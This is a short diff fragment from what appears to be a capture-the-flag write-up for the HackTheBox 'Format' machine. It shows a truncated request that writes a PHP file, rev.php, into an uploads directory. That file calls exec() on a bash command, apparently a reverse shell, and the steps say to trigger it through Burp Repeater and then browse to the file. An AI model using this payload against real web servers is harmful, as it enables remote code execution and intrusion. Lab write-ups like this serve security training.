@@ -192,7 +192,9 @@ id=/var/www/microblog/blog_name/uploads/rev.php&txt=<%3fphp+exec("/bin/bash+-c+'
 
 ```
 Hit SEND on Repeater Burpy;
+
 Navigate to: http://sarmale.microblog.htb/uploads/rev.php (OFC CHANGE TO YOUR BLOG)
 
 ![image](https://github.com/st1llz0r/Format/assets/142597099/aa70134b-2690-4491-a089-97c865a234b6)
+
 
